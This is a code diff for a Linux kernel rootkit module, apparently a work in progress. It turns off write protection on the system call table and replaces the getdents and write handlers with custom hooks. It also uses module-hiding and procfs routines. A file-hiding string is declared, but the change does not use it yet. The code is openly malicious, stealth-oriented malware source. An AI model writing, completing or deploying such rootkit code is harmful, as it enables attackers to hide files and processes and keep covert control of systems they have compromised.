@@ -24,13 +24,23 @@ asmlinkage long (*original_getdents)(unsigned int,
 
 asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
 {
-    sprintf("test");
+    // printk(KERN_ALERT "test write");
     return original_write(i,u,s);
 }
 
-asmlinkage long custom_getdents(unsigned int i, struct linux_dirent __user *u, unsigned int i2)
+/*
+ * Overriding getdents function
+ * Arguments :
+ * fd = file descriptor, reffering the directory
+ * dirp = buffer for linux_dirent structure
+ * count = size of the buffer
+ */
+asmlinkage long custom_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
-    return original_getdents(i, u, i2);
+    asmlinkage long tmp = (*original_getdents)(fd, dirp, count);
+    char hide[] = "ker_mod";
+
+    return tmp;
 }
 
 void module_hide(void)
@@ -130,9 +140,13 @@ static int __init rootkit_init(void)
 		}
     original_getdents = (void*)syscall_table[__NR_getdents];
     original_write = (void*)syscall_table[__NR_write];
+    /* Making sys_call_table read/write */
     GPF_DISABLE();
+    syscall_table[__NR_getdents] = (long)custom_getdents;
     syscall_table[__NR_write] = (long)custom_write;
-		printk(KERN_INFO "Loading rootkit\n");
+    /* sys_call_table back to read-only */
+    GPF_ENABLE();
+    printk(KERN_INFO "Loading rootkit\n");
 		return 0;
 }
 
@@ -142,8 +156,11 @@ static void __exit rootkit_exit(void)
 		module_show();
 		procfs_clean();
 		module_hide();
+    /* Making sys_call_table read/write */
+    GPF_DISABLE();
     syscall_table[__NR_write] = (long)original_write;
     syscall_table[__NR_getdents] = (long)original_getdents;
+    /* sys_call_table back to read-only */
     GPF_ENABLE();
 		printk(KERN_INFO "Closing rootkit\n");
 }
